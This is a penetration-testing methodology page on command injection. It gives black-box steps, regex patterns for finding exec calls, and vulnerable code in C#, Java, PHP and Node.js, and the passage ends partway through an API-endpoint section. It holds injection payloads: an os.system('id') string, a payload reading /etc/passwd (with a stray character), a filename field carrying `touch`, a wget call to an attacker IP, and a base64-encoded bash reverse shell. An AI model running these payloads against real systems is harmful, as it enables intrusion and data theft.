# Command Injection

## Check List

## Methodology

### Black Box

#### [Reflected Command Injection In an Embedded Cloud Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt)

{% stepper %}
{% step %}
When a web application includes a terminal, shell, or IDE interface (e.g., Cloud Shell, Dev Console, Admin Terminal), test URL parameters (project, env, config) for command injection.
{% endstep %}

{% step %}
Access the cloud console or developer environment and identify a terminal or shell interface (`via ?show=ide,terminal, ?mode=console,` or a "`Terminal`" tab)
{% endstep %}

{% step %}
Locate a configurable parameter (`project`, `env`, `workspace`, `config`) in the URL that influences the terminal session or backend configuration and Change `?project=test` and observe the terminal prompt or project name update
{% endstep %}

{% step %}
Switch to a minimal or IDE-only view (`show=ide`, `view=code`) where the parameter is likely processed in a script (`Python`, `Node.js`, `etc.`)
{% endstep %}

{% step %}
inject a single quote (`'`) into the parameter and reload; if a script syntax error appears in the terminal (`SyntaxError`, `unexpected token`), it confirms direct reflection without encoding
{% endstep %}

{% step %}
Use **syntax closure** to neutralize the original code

* If reflection is in `if 'value':`, close with `':#` to comment out the rest
* If multi-line, use triple quotes: `''';` to close strings. Set `project=asd':#` or `project=asd''';print(''` to fix syntax and gain control
{% endstep %}

{% step %}
inject `project=asd''';import os;os.system("id");print(''` , Reload and check terminal output for `uid=....`
{% endstep %}
{% endstepper %}

***

#### [Language Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt)

{% stepper %}
{% step %}
Log in to the target site
{% endstep %}

{% step %}
Then use the burp suite tool to inspect the requests and identify the endpoints
{% endstep %}

{% step %}
Then, check in the identified endpoints whether there is a parameter called `language=` or a parameter that specifies the language
{% endstep %}

{% step %}
Then send the request to the repeater and replace the language parameter value with the following content and if the send method was `GET`, change it to `POST`

```bash
{${system("cat+/etc/passwd"J)}}
```
{% endstep %}

{% step %}
Send the request and then check whether the server's response shows the sensitive file content
{% endstep %}
{% endstepper %}

***

### White Box

#### OS Command Injection in Filename

{% stepper %}
{% step %}
Identify the target product and inspect files related to modules responsible for file management, media handling, audio recording, format conversion, or user data processing
{% endstep %}

{% step %}
Identify all AJAX endpoints, APIs, or forms through which authenticated users can submit filenames, file paths, or other file-related parameters
{% endstep %}

{% step %}
Identify parameters whose values are directly received from user requests (such as `file`, `filename`, `path`, `name`, and similar arrays)
{% endstep %}

{% step %}
Trace the data flow of each parameter from the request entry point to its usage location in the code
{% endstep %}

{% step %}
Search the source code for functions that execute operating system commands, such as `exec`, `system`, `shell_exec`, `popen`, `proc_open`, or their equivalents in other languages

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void fixeRIFF(string filename){
        string[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(string.IsNullOrEmpty(out[0])){
                string f;
                if (Request.Form["name"] != null && Request.Form["name"].StartsWith("custom/")) {
                        f = Request.Form["name"].Replace("custom/", "");
                } else {
                        f = Request.Form["file"].Replace("custom/", "");
                }
                string cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void fixeRIFF(String filename){
        String[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(out[0].isEmpty()){
                String f;
                if (request.getParameter("name") != null && request.getParameter("name").startsWith("custom/")) {
                        f = request.getParameter("name").replace("custom/", "");
                } else {
                        f = request.getParameter("file").replace("custom/", "");
                }
                String cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function fixeRIFF($filename){
        exec("file -b $filename | grep 'RIFF' ", $out, $ret);
        if($ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(empty($out[0])){
                if (isset($_POST["name"]) && str_starts_with($_POST["name"], "custom/")) {
                        $f = str_replace("custom/", "", $_POST["name"]);
                } else {
                        $f = str_replace("custom/", "", $_POST["file"]);
                }
                $cmd = "mv ".$this->temp."/$f.wav $filename";
                exec($cmd, $out, $ret);
        }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function fixeRIFF(filename){
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(!out[0]){
                let f;
                if (req.body.name && req.body.name.startsWith("custom/")) {
                        f = req.body.name.replace("custom/", "");
                } else {
                        f = req.body.file.replace("custom/", "");
                }
                let cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether user-controlled input is inserted into operating system commands without proper validation, filtering, or escaping
{% endstep %}

{% step %}
Check whether the input value can contain special shell characters such as `;`, `&&`, `|`, `` ` ``, `$()`, or similar characters
{% endstep %}

{% step %}
In one of the controllable parameters, place a filename along with a command separator character and a simple harmless command
{% endstep %}

{% step %}
Send the request and verify whether the injected command has been executed on the system

```http
POST /admin/ajax.php HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

file=dummy.wav;`touch /var/www/html/pawned`&language=en&temporary[en]=0&filenames[en]=dummy.wav&command=gethtml5&module=recordings
```
{% endstep %}
{% endstepper %}

***

#### Unsanitized Administrative Configuration Parameters Leading to Remote Code Execution

{% stepper %}
{% step %}
Identify the target product and inspect modules that provide administrative operations, service restart functionality, Poller management, Broker management, Agent management, or system configuration processing
{% endstep %}

{% step %}
Locate the backend files related to these functionalities and identify the paths that process administrative panel requests
{% endstep %}

{% step %}
Trace the complete data flow from the administrative interface to the point where the command is executed on the operating system
{% endstep %}

{% step %}
Search the source code for operating system command execution functions such as `shell_exec`, `exec`, `system`, `popen`, or their equivalents

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
void Reload()
{
    if ((command = this.GetReloadCommand()) != null) {
     // vulnerable code !!!   
     System.Diagnostics.Process.Start("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
void reload()
{
    if ((command = this.getReloadCommand()) != null) {
     // vulnerable code !!!   
     Runtime.getRuntime().exec("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function reload()
{
   if ($command = $this->getReloadCommand()) {
   // vulnerable code !!!
   shell_exec("sudo " . $command);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { exec } = require('child_process');

function reload()
{
    if (command = this.getReloadCommand()) {
     // vulnerable code !!!   
     exec("sudo " + command);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether values received from the database, administrative settings, or user requests are directly inserted into shell commands

{% tabs %}
{% tab title="C#" %}
```csharp
private string GetReloadCommand()
{
    string command = null;

    var result = this.db.Query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.Fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private String getReloadCommand()
{
    String command = null;

    var result = this.db.query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function getReloadCommand(): ?string
{
    $command = null;

    $result = $this->db->query(
        'SELECT broker_reload_command
        FROM nagios_server
        ORDER BY localhost DESC'
    );

if ($row = $result->fetch()) {
        $command = $row['broker_reload_command'];
    }

return $command;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function getReloadCommand()
{
    let command = null;

    let result = this.db.query(
        'SELECT broker_reload_command ' +
        'FROM nagios_server ' +
        'ORDER BY localhost DESC'
    );

    if (row = result.fetch()) {
        command = row['broker_reload_command'];
    }

    return command;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then verify whether input validation or filtering is absent. Set up a local server and send the request using the system command `wget http://<attacker_ip>` in the input
{% endstep %}
{% endstepper %}

***

#### Command Injection via Misconfigured Chromium Binary Path in Administrative PDF Generation Feature

{% stepper %}
{% step %}
Identify the target website or product and log in with an administrator account.
{% endstep %}

{% step %}
Enter the application’s administrative panel and locate the system configuration paths `(Setup / Configuration)` that include parameters related to external tools
{% endstep %}

{% step %}
Then, within the setup or administrative paths, look for parameters and inputs that store tool execution paths (such as `chromium_path`, `binary_path`, or similar)
{% endstep %}

{% step %}
In the server-side code, find the files that use this value and look for the use of system execution functions such as `exec()`
{% endstep %}

{% step %}
Check whether the value read from the configuration is properly sanitized or escaped before being passed to `exec()`

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
string chromium_dir = io_safe_output(config["chromium_path"]);
var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

if (string.IsNullOrEmpty(result_ejecution.ToString()) == true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;
        
-----------------------------------------------------------------------------------
public void GeneratePDF(
    List<object> items,
    Dictionary<string, object> options = null,
    Dictionary<string, object> optionsPDF = null
)
{
    var config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    string chromium_dir = io_safe_output(config["chromium_path"]);
    var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

    if (string.IsNullOrEmpty(result_ejecution.ToString()) == true)
    {
        string message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new ArgumentException(message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
String chromium_dir = io_safe_output(config.get("chromium_path"));
String result_ejecution = Runtime.getRuntime().exec(chromium_dir + " --version").toString();

if (result_ejecution.isEmpty() == true) {
    if (params.get("return_img_base_64")) {
        params.put("base64", true);
--------------------------------------------------------------------------------------------

// Begin vulnerable code section
public void generatePDF(
    List<Object> items,
    Map<String, Object> options,
    Map<String, Object> optionsPDF
) {
    Map<String, Object> config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    String chromium_dir = io_safe_output((String) config.get("chromium_path"));
    String result_ejecution = Runtime.getRuntime()
        .exec(chromium_dir + " --version")
        .toString();

    if (result_ejecution.isEmpty() == true) {
        String message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new IllegalArgumentException(message_error);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
$chromium_dir = io_safe_output($config['chromium_path']);
$result_ejecution = exec($chromium_dir.' --version');
if (empty($result_ejecution) === true) {
    if ($params['return_img_base_64']) {
        $params['base64'] = true;
-------------------------------------------------------------

// Begin vulnerable code section
public function generatePDF(
    array $items,
    ?array $options = [],
    ?array $optionsPDF = null
) {
    global $config;

    // If not install chromium avoid 500 convert tu images no data to show.
    $chromium_dir = io_safe_output($config['chromium_path']);
    $result_ejecution = exec($chromium_dir.' --version');
    if (empty($result_ejecution) === true) {
        $message_error = __('chromium is not installed').', ';
        $message_error .= __('To be able to create images of the graphs for PDFs, please install the chromium extension.');
        $message_error .= '<a href="https://www.chromium.org/getting-involved/download-chromium/" target="_blank">';
        $message_error .= __('Info chromium');
        $message_error .= '</a>';

        throw new InvalidArgumentException($message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
const chromium_dir = io_safe_output(config.chromium_path);
const { execSync } = require('child_process');

const result_ejecution = execSync(chromium_dir + " --version").toString();

if (result_ejecution.length === 0 === true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;

---------------------------------------------------------------------------

// Begin vulnerable code section
function generatePDF(
    items,
    options = {},
    optionsPDF = null
) {
    const config = global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    const chromium_dir = io_safe_output(config.chromium_path);
    const { execSync } = require('child_process');

    const result_ejecution = execSync(chromium_dir + " --version").toString();

    if (result_ejecution.length === 0 === true) {
        let message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new Error(message_error);
        return;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Important note: **this vulnerability occurs when a report is created and then exported to PDF, and the report must be of chart type to be exported to PDF. In this case, the execution path of the user input, which is `chromium_path`, reaches the `exec` function**
{% endstep %}
{% endstepper %}

***

#### Command Injection via Backup Filename

{% stepper %}
{% step %}
Identify the target product, then locate Backup, Restore, Export, or filesystem operation modules in the administrative panel
{% endstep %}

{% step %}
Find the paths where the user can enter the filename, backup name, storage path, or similar values
{% endstep %}

{% step %}
In the source code, locate the files related to the Backup functionality and inspect the main backup creation functions
{% endstep %}

{% step %}
Trace the user input flow in the source code until the backup filename processing stage, and at the processing point look for the use of system functions

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// begin vulnerable code section
public void CreateBackup(string name, int mode, ref string real_name, bool from_programming = false) {
    var config = Global.config;

    var time = DateTime.Now;
    string formatted_time = time.ToString("dd-MM-yy-hh-mm-ss");

    if (real_name == "") {
        string name_without_blank = safe_output(name).Replace(" ", "_space_");
        //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).Substring(10) + "---" + formatted_time;
        real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
    }

    string sqlfile = "";
    string attachmentsfile = "";

    switch (mode) {
        case 0:
            sqlfile = "db_backup_" + real_name + ".sql";
            break;

        case 1:
            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
            System.IO.Directory.CreateDirectory(attachmentsfile);
            break;

        case 2:
            sqlfile = "db_backup_" + real_name + ".sql";

            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
            System.IO.Directory.CreateDirectory(attachmentsfile);
            break;
    }

    string uname = System.Runtime.InteropServices.RuntimeInformation.OSDescription;
    bool so_win = System.Text.RegularExpressions.Regex.IsMatch(uname, "(.)*Windows(.)*", System.Text.RegularExpressions.RegexOptions.IgnoreCase);

    string command_copy;

    if (so_win) {
        config["homedir"] = config["homedir"].Replace("/", "\\");
        command_copy = string.Format("xcopy " + config["homedir"] + "attachment\\* {0} ", attachmentsfile);
    }
    else {
        command_copy = string.Format("cp -r " + config["homedir"] + "attachment/* {0} ", attachmentsfile);
    }

    bool process = true;

    if (sqlfile != "") {
        string command;

        if (config["dbpass"] == "") {
            command = string.Format("mysqldump -h {0} -u {1} {2} > {3} ",
                config["dbhost"],
                config["dbuser"],
                config["dbname"],
                sqlfile);
        } else {
            command = string.Format("mysqldump -h {0} -u {1} -p{2} {3} > {4} ",
                config["dbhost"],
                config["dbuser"],
                config["dbpass"],
                config["dbname"],
                sqlfile);
        }

        // this is where the actual RCE gets executed
        System.Diagnostics.Process.Start(command);
    }

    // this is where the actual RCE gets executed
    if (attachmentsfile != "") {
        var result = System.Diagnostics.Process.Start(command_copy);
    }
}
// end vulnerable code section
```
{% endtab %}

{% tab title="Java" %}
<pre class="language-java"><code class="lang-java">// begin vulnerable code section
<strong>public void create_backup(String name, int mode, String[] real_name, boolean from_programming) {
</strong>    var config = Global.config;

    var time = java.time.LocalDateTime.now();
    String formatted_time = time.format(java.time.format.DateTimeFormatter.ofPattern("dd-MM-yy-hh-mm-ss"));

    if (real_name[0].equals("")) {
        String name_without_blank = safe_output(name).replace(" ", "_space_");
        //real_name[0] = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substring(10) + "---" + formatted_time;
        real_name[0] = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
    }

    String sqlfile = "";
    String attachmentsfile = "";

    switch (mode) {
        case 0:
            sqlfile = "db_backup_" + real_name[0] + ".sql";
            break;

        case 1:
            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
            new java.io.File(attachmentsfile).mkdir();
            break;

        case 2:
            sqlfile = "db_backup_" + real_name[0] + ".sql";

            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
            new java.io.File(attachmentsfile).mkdir();
            break;
    }

    String uname = System.getProperty("os.name");
    boolean so_win = uname.matches("(.)*Windows(.)*");

    String command_copy;

    if (so_win) {
        config.put("homedir", config.get("homedir").replace("/", "\\\\"));
        command_copy = String.format("xcopy " + config.get("homedir") + "attachment\\* %s ", attachmentsfile);
    }
    else {
        command_copy = String.format("cp -r " + config.get("homedir") + "attachment/* %s ", attachmentsfile);
    }

    boolean process = true;

    if (!sqlfile.equals("")) {
        String command;

        if (config.get("dbpass").equals("")) {
            command = String.format("mysqldump -h %s -u %s %s > %s ",
                config.get("dbhost"),
                config.get("dbuser"),
                config.get("dbname"),
                sqlfile);
        } else {
            command = String.format("mysqldump -h %s -u %s -p%s %s > %s ",
                config.get("dbhost"),
                config.get("dbuser"),
                config.get("dbpass"),
                config.get("dbname"),
                sqlfile);
        }

        // this is where the actual RCE gets executed
        Runtime.getRuntime().exec(command);
    }

    // this is where the actual RCE gets executed
    if (!attachmentsfile.equals("")) {
        Process result = Runtime.getRuntime().exec(command_copy);
    }
}
// end vulnerable code section
</code></pre>
{% endtab %}

{% tab title="PHP" %}
```php
// begin vulnerable code section
function create_backup ($name, $mode, &$real_name, $from_programming = false) {
        global $config;

        $time = new DateTime('now');
        $time = $time->format("d-m-y-h-i-s");

        if ($real_name == "") {
                $name_without_blank = str_replace(" ", "_space_", safe_output($name));
                //$real_name = "IntegriaBackup---" . 0 . "---" . $mode . "---" . $name_without_blank . "---" . substr(MD5(rand(1000, 1000000000)), 10) . "---" . $time;
                $real_name = "IB---" . 0 . "---" . $mode . "---" . $name_without_blank. "---". $time;
        }

        $sqlfile = "";
        $attachmentsfile = "";

        switch ($mode) {
                case 0:
                        $sqlfile = "db_backup_" . $real_name . ".sql";
                        break;

                case 1:
                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;

                case 2:
                        $sqlfile = "db_backup_" . $real_name . ".sql";

                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;
        }

        $uname = php_uname();
        $so_win = preg_match("/(.)*Windows(.)*/i",$uname);

        if ($so_win) {
                $config['homedir'] = str_replace("/", "\\", $$config['homedir']);
                $command_copy = sprintf ('xcopy ' . $config['homedir'] . 'attachment\* %s ', $attachmentsfile);
        }
        else {
                $command_copy = sprintf ('cp -r ' . $config['homedir'] . 'attachment/* %s ', $attachmentsfile);
        }

        $process = true;

        if ($sqlfile != "") {
                if ($config["dbpass"] == "") {
                        $command = sprintf ('mysqldump -h %s -u %s %s > %s ', $config['dbhost'], $config['dbuser'], $config['dbname'],$sqlfile);
                } else {
                        $command = sprintf ('mysqldump -h %s -u %s -p%s %s > %s ',$config['dbhost'], $config['dbuser'],$config['dbpass'], $config['dbname'],$sqlfile);
                }

                // this is where the actual RCE gets executed
                exec($command);
        }

        // this is where the actual RCE gets executed
        if ($attachmentsfile != "") {
                $result = exec($command_copy);
        }
}
// end vulnerable code section
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// begin vulnerable code section
const { execSync } = require('child_process');

function create_backup(name, mode, real_name, from_programming = false) {
        const config = global.config;

        let time = new Date();

        let formatted_time =
            time.getDate() + "-" +
            (time.getMonth() + 1) + "-" +
            time.getFullYear().toString().slice(-2) + "-" +
            time.getHours() + "-" +
            time.getMinutes() + "-" +
            time.getSeconds();

        if (real_name == "") {
                let name_without_blank = safe_output(name).replace(/ /g, "_space_");
                //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substr(10) + "---" + formatted_time;
                real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
        }

        let sqlfile = "";
        let attachmentsfile = "";

        switch (mode) {
                case 0:
                        sqlfile = "db_backup_" + real_name + ".sql";
                        break;

                case 1:
                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
                        require('fs').mkdirSync(attachmentsfile);
                        break;

                case 2:
                        sqlfile = "db_backup_" + real_name + ".sql";

                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
                        require('fs').mkdirSync(attachmentsfile);
                        break;
        }

        let uname = process.platform;
        let so_win = /(.)*Windows(.)*/i.test(uname);

        let command_copy;

        if (so_win) {
                config['homedir'] = config['homedir'].replace(/\//g, "\\");
                command_copy = `xcopy ${config['homedir']}attachment\\* ${attachmentsfile} `;
        }
        else {
                command_copy = `cp -r ${config['homedir']}attachment/* ${attachmentsfile} `;
        }

        let process_exec = true;

        if (sqlfile != "") {
                let command;

                if (config["dbpass"] == "") {
                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} ${config['dbname']} > ${sqlfile} `;
                } else {
                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} -p${config['dbpass']} ${config['dbname']} > ${sqlfile} `;
                }

                // this is where the actual RCE gets executed
                execSync(command);
        }

        // this is where the actual RCE gets executed
        if (attachmentsfile != "") {
                let result = execSync(command_copy);
        }
}
// end vulnerable code section
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If restrictions exist, test bypass methods such as `${IFS}`, Base64 Encoding, or Command Chaining

```bash
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
{% endstep %}

{% step %}
Then send the request, and if a request is made to your server, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Command Execution via Exposed Administrative API Endpoint

{% stepper %}
{% step %}
Identify files related to API Mapping or Servlet Configuration (such as XML config files or `.config` files)

```xml
<api id="com.hp.ci.mgmt.guidpools.controllers.PoolController.executeCommand(HttpServletRequest,HttpServletResponse,ExecutableCommand,String,String,String)" method="PUT" uri="/rest/id-pools/executeCommand" internal-uri="/guidapp/rest/id-pools/executeCommand" public="false" no-cli="false" input-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand" output-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand">
                    <requestHeader default="en_US" required="true" dto="java.lang.String" name="Accept-Language">
                        <description default="true">
            The language code requested in the response. If a suitable match to
            the requested language is not available, en-US or the appliance locale is used.
        </description>
                    </requestHeader>
                    <requestHeader required="false" dto="java.lang.String" name="Auth">
                        <description default="true">
            Session authorization token obtained from <a href="rest:resource:/rest/login-sessions">logging in</a>.  If this header is
            not included or if the session-token is invalid, the response code will be 401 Unauthorized.
        </description>
                    </requestHeader>
                    <requestHeader required="true" dto="java.lang.String" name="Content-Type" required-value="application/json">
                        <description default="true">
            The data format sent in the request body. If the Content-Type header is not provided, application/octet-stream
            is assumed. Any value other than the required value will result in a response code of 415 Unsupported Media Type.
        </description>
                    </requestHeader>
                    <requestHeader required="false" dto="java.lang.String" name="If-None-Match">
                        <description default="true">
            The request is conditionally processed only if the current ETag for the resource does not match the ETag passed in this
            header. If the ETag specified in this header matches the resource's current ETag, the status code returned from the GET
            will be 304 Not Modified.
        </description>
                    </requestHeader>
                    <authInfo auth-type="NO_AUTH">
                        <description default="true">
            This API requires no authorization.
        </description>
                    </authInfo>
                </api>
```
{% endstep %}

{% step %}
Review the file and look for endpoints or API routes in the application configuration that perform system command execution (such as `executeCommand`)
{% endstep %}

